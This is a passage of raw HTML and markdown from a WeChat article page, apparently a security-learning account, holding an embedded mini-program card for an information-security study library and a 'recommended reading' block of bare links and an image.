nodeleaf=""><mp-common-miniprogram class="js_uneditable custom_select_card mp_miniprogram_iframe" data-pluginname="insertminiprogram" data-miniprogram-path="pages/index/index?shareId=e3cb38cefa77595a6e512eae049953037e275bbab66071ed2f33d98fdf64e6f3" data-miniprogram-nickname="ima知识库" data-miniprogram-avatar="http://mmbiz.qpic.cn/sz_mmbiz_png/JkibkGcLiaJbVFXj8nYrmL5iab8KYwalibCtCjnicUJ6KFK8G4uC0VgesgxIL1iaTckOZYlKXNEtaBNeazcD8PLcic0zA/640?wx_fmt=png&amp;wxfrom=200" data-miniprogram-title="潇湘信安学习资料库（更新~ing!）" data-miniprogram-imageurl="http://mmbiz.qpic.cn/sz_mmbiz_jpg/zqnzfCSS1kC6ohbbn1EEAjmjkMbLqKC0TevicIR9DOX2IiafOBL5J7ygLr5khHY1XvTibQjqsA412O6HicaL1eyHvANjXdfI5DkCJWficVQibIzia0/0?wx_fmt=jpeg" data-miniprogram-type="card" data-miniprogram-servicetype="0" data-miniprogram-appid="wx4c6401744b734596" data-miniprogram-imageurlback="https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FzqnzfCSS1kABnOfCKmD6QCfNgmCk1eSkyoGEqZHw5Z54qG2khyAQ32PcGWx9Fz4ESFE2wjVOyRuNLtBhnl3jRbnY7clNeC2uppGr6jXArJ0%2F0%3Fwx_fmt%3Djpeg%26from%3Dappmsg" data-miniprogram-cropperinfo="%7B%22c%22%3A%7B%22x%22%3A0%2C%22y%22%3A59%2C%22x2%22%3A182%2C%22y2%22%3A204.6%2C%22w%22%3A182%2C%22h%22%3A145.6%7D%7D"></mp-common-miniprogram></section></td></tr></tbody></table>  
  
**推 荐 阅 读**  
  
  
  
  
[](https://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247499188&idx=1&sn=9ce15a0e66b2595285e544aaa0c49c24&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247496043&idx=1&sn=4daa27ade9915de6021fea1c2a21d7bc&scene=21#wechat_redirect)  
  
[](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdAPjIVeN2ZahG9ibP0Y3wlfg6BO1WO7MZfo1JeW7zDWcLSTQ5Ek8zXAia5w1nMnogpbpXP6OxXXOicA/640?wx_fmt=png "")  
  
